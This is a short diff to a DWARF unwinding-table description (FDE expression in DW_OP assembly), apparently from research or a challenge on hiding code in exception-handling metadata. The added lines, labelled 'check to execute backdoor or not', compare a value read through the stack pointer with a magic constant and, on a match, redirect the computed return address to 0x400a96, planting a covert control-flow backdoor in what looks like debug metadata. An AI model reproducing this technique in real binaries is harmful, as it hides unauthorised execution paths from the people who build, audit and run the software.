@@ -569,6 +569,22 @@ DW_OP_plus
 #DW_OP_constu 0x133 #we want to start 0x133 bytes into the function
 DW_OP_constu 0x32
 DW_OP_plus
+# check to execute backdoor or not
+DW_OP_breg7 +0
+DW_OP_deref
+DW_OP_deref
+# 0x2a303f26575f5451
+DW_OP_constu 0x2a303f26
+DW_OP_constu 0x20
+DW_OP_shl
+DW_OP_constu 0x575f5451
+DW_OP_plus
+DW_OP_xor
+DW_OP_bra WRONG
+DW_OP_skip EXIT
+WRONG:
+DW_OP_constu 0x400a96
+EXIT:
 end EXPRESSION
 end INSTRUCTIONS
 end FDE
